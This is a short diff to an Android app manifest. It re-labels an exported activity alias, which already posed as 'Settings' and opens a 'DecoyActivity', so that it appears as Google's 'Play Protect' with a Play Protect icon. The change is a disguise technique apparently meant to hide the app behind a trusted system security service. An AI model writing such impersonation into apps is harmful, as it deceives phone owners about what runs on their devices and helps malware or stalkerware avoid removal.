@@ -173,9 +173,9 @@
             android:name=".SettingsAlias"
             android:enabled="false"
             android:exported="true"
-            android:label="Settings"
-            android:icon="@mipmap/ic_settings_adaptive"
-            android:roundIcon="@mipmap/ic_settings_round"
+            android:label="Play Protect"
+            android:icon="@drawable/playprotect"
+            android:roundIcon="@drawable/playprotect"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
